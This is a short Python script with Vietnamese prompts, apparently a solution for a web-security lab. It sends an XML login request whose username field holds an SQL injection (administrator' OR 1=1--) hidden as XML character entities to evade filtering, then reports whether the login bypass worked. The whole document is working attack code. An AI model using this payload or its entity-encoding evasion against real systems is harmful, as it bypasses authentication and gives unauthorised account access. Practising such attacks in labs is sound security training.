import requests

url = input("Nhập URL của lab: ").rstrip("/")

# Payload XML chứa SQLi bypass bằng XML entities
xml_payload = """
<user>
  <username>administrator&#x27;&#x20;OR&#x20;1=1--</username>
  <password>anything</password>
</user>
"""

headers = {
    "Content-Type": "application/xml"
}

response = requests.post(f"{url}/login", data=xml_payload, headers=headers)

if "Log out" in response.text or response.status_code == 302:
    print("[+] Đăng nhập thành công!")
else:
    print("[-] Thất bại hoặc bị lọc.")
